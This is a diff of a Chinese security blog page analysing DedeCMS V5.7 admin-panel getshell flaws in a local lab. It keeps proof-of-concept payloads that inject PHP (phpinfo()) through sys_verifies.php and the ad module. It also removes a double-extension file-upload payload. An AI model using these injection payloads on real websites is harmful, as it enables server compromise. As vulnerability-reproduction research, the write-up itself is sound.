@@ -11,13 +11,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
+  <meta name="description" content="打算先从复现一些简单的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
 <meta name="keywords" content="cms,代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Dedecms漏洞分析">
 <meta property="og:url" content="https://glotozz.github.io/2019/09/23/Dedecms漏洞分析/index.html">
 <meta property="og:site_name" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
-<meta property="og:description" content="打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
+<meta property="og:description" content="打算先从复现一些简单的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/09/23/K1FIiouscT7eJbL.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/23/Ze1dSwLlfH7VkxM.png">
@@ -42,10 +42,10 @@
 <meta property="og:image" content="https://i.loli.net/2019/09/23/jSOrpyVeLGhH6Uz.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/23/qyHoJ2sakNc1PLl.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/23/w4zLNuXASQiotrO.png">
-<meta property="og:updated_time" content="2019-09-23T11:30:56.897Z">
+<meta property="og:updated_time" content="2019-09-23T11:35:43.827Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Dedecms漏洞分析">
-<meta name="twitter:description" content="打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
+<meta name="twitter:description" content="打算先从复现一些简单的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞">
 <meta name="twitter:image" content="https://i.loli.net/2019/09/23/K1FIiouscT7eJbL.png">
   
   
@@ -196,13 +196,14 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>打算先从复现一些简单那的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞</p>
+<p>打算先从复现一些简单的cms开始，力哥建议比如seacms、duomicms、dedecms等，今天复现下dedecms的几处漏洞</p>
 </blockquote>
 <a id="more"></a>
 
 <meta name="referrer" content="no-referrer">
+#### 一、获取漏洞
 
-<h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>dedecms V5.7 后台getshell</p>
+<p>dedecms V5.7 后台getshell</p>
 <h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>Payload1</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/sys_verifies.php?action=getfiles&amp;refiles[]=\%22;phpinfo();//</span><br></pre></td></tr></table></figure>
 
@@ -219,12 +220,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">插入ad内容	--&gt;&lt;?php phpinfo();?&gt;</span><br><span class="line">http://127.0.0.1/dede/plus/ad_js.php?nocache=1&amp;aid=1</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2019/09/23/p3c61bPCWfKUgT2.png" alt="Snipaste_2019-09-23_14-51-18.png"></p>
-<p>Paylaod5</p>
-<p>文件上传，准备一个内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>的info.jpg.php，压缩为info.jpg.zip，上传到soft目录下</p>
-<p>访问dede/album_add.php</p>
 <h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
 <p>先根据payload1自己在当前文件寻找分析一波</p>
 </blockquote>
@@ -300,7 +295,7 @@
 <p>从数据库#@__myad读取，搜索插入数据库的地方</p>
 <p>ad_add.php</p>
 <p><img src="https://i.loli.net/2019/09/23/w4zLNuXASQiotrO.png" alt="Snipaste_2019-09-23_14-42-01.png"></p>
-<p>直接在前端页面插入，注意闭合前面的–&gt;</p>
+<p>发现没有什么对我们有影响的过滤，直接在前端页面插入，注意闭合前面的–&gt;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/dede/ad_add.php</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt;&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
@@ -577,15 +572,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">cms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -597,7 +588,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CVE</a>
+                <a href="javascript:void(0)" class="js-tag color4">cms</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -617,11 +612,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">start</a>
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+                <a href="javascript:void(0)" class="js-tag color1">start</a>
               </li>
              
               <li class="article-tag-list-item">
